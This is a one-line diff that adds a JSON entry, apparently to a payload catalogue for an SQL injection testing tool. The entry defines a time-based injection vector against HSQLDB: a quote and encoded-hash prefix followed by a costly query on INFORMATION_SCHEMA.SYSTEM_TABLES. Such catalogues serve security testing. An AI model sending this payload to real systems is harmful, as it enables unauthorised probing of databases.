@@ -1,0 +1,1 @@
+{"dbms": "hsqldb", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_TABLES)", "comment": "hsqldb time: single+enc hash"}
